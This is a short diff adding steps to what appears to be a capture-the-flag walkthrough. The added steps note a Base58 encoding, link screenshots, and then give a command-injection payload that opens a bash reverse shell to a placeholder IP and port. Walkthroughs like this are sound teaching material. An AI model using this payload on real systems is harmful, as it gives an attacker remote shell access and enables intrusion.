@@ -33,3 +33,19 @@ Now on the page we see the result.
 
 ![image](https://user-images.githubusercontent.com/5285547/129071126-5810cb0f-273c-473e-a8de-a117fc8b32d9.png)
 
+Checking the encoding, it turns out its Base58
+
+![image](https://user-images.githubusercontent.com/5285547/129075155-f2d4cab2-28b4-4fa5-94e0-bb741ec74391.png)
+
+![image](https://user-images.githubusercontent.com/5285547/129083902-4b104c8a-ba76-4b90-9a19-8ddf1f623217.png)
+
+Next was to get a reverse shell. 
+
+```
+# payload
+;bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1";
+```
+
+![image](https://user-images.githubusercontent.com/5285547/129084566-7f38c45b-3083-47b7-b3c5-667bcac3b5e2.png)
+
+
